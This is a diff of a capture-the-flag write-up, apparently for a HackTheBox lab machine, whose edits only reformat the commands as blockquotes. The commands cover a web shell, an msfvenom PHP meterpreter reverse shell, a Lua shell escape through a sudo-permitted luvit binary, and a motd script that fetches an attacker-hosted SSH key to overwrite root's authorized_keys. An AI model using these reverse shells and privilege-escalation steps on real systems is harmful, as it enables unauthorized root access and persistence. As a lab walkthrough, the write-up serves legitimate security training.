@@ -30,15 +30,15 @@ If we also click on the Github link for that particular shell we get a set of de
 
 Wonderful, we have a web shell. This shell is fully functional and you can use it to priv-esc to the actual user with minimal issues. I didn't want to deal with it, though, so I compiled my own php shell with msfvenom, uploaded it, set up a metasploit handler to catch the connection, accessed my shell url, and used that shell going forward:
 
-**msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php**
+>**msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php**
 
 Once we have this shell, time to enumerate. You can do this manually, but to save time I used the linux enumeration script found [here](https://github.com/diego-treitos/linux-smart-enumeration), using wget to download the script directly to the machine:
 
-**wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh**
+>**wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh**
 
 Running that script shows us that we have a command we're allowed to run as sudo, /home/sysadmin/luvit. If we also take a look at our home directory we have a file called note.txt which explains the sysadmin left us a way to mess around with lua, which is presumably that file. We can run the file with the following command:
 
-**sudo -u sysadmin /home/sysadmin/luvit**
+>**sudo -u sysadmin /home/sysadmin/luvit**
 
 Running it, however, gets us an error. Specifically, we get a *traceback* error that the script tries to call a method that doesn't exist. Going by the name of the machine, we're on the right track.
 
@@ -46,7 +46,7 @@ Running it, however, gets us an error. Specifically, we get a *traceback* error 
 
 Combing that output from the traceback might not give you much at first glance, but when I tried to throw the output of running luvit into a text file I noticed the error message was not included. What was included at the end of the file was a carrot character, which indicated to me that this might be the lua interpreter, similar to the python interpreter. Therefore, we might be able to pass it a command or script, which ended up working. I used [this](https://justhack.in/shell-escapes-cheatsheet) link to grab a very easy shell escape script, which I uploaded to the host, appended with the same luvit command, and ran:
 
-**sudo -u sysadmin /host/sysadmin/luvit shell.lua**
+>**sudo -u sysadmin /host/sysadmin/luvit shell.lua**
 
 This got me a functional bash shell for the sysadmin user, but it was still coming through the webadmin user's meterpreter shell, which was a pain. I generated a second shell, this time just a standard linux reverse tcp meterpreter shell, uploaded it, created a new handler to catch the shell, and ran it as the sysadmin user to get a sysadmin meterpreter shell.
 
@@ -60,21 +60,25 @@ To do this, I used ssh-keygen to create the key pair on my local kali machine, d
 Since the etc/.upload-motd.d files are quickly overwritten (they're maybe there for 5-15 seconds before going back to the original set) I couldn't upload a reverse shell, as it would die rather quickly. What we can do as root, though, is add another set of ssh keys so we can just ssh to the box as root. To do so, we need to replace the motd file and ssh into the box as webadmin to execute the script before it is overwritten. Multiple shell windows queued and ready to go helps here. I hosted the directory with the ssh keys using python's SimpleHTTPServer, and grabbed them with the bash script that we replaced the motd header with:
 
 Local machine (from the directory with the bash script '00-header' inside):
-**python -m SimpleHTTPServer 80**
+>**python -m SimpleHTTPServer 80**
 
 Bash script:
-**#!/bin/sh
+
+>**#!/bin/sh
 wget http://10.10.14.4/root-key-rsa.pub -P /root/.ssh
 cat /root/.ssh/root-key-rsa.pub > /root/.ssh/authorized_keys**
 
 Sysadmin shell:
-**meterpreter>upload 00-header /etc/.update-motd.d/00-header
+
+>**meterpreter>upload 00-header /etc/.update-motd.d/00-header
 meterpreter> cat 00-header**
+
 (that cat is to confirm 00-header is the correct file and hasn't been immediately overwritten)
 
 Local machine (separate shell window)
-**ssh -i ./webadmin-rsa-key webadmin@10.10.10.181**
+
+>**ssh -i ./webadmin-rsa-key webadmin@10.10.10.181**
 
 As long as the sysadmin shell command and the ssh command were done closely enough together and in sequence, the root ssh key overwrite works well. Now we can just ssh back to the host as root using that new ssh key, grab the root flag, and finish this box off entirely
 
-**ssh -i ./root-key-rsa root@10.10.10.181**
+>**ssh -i ./root-key-rsa root@10.10.10.181**
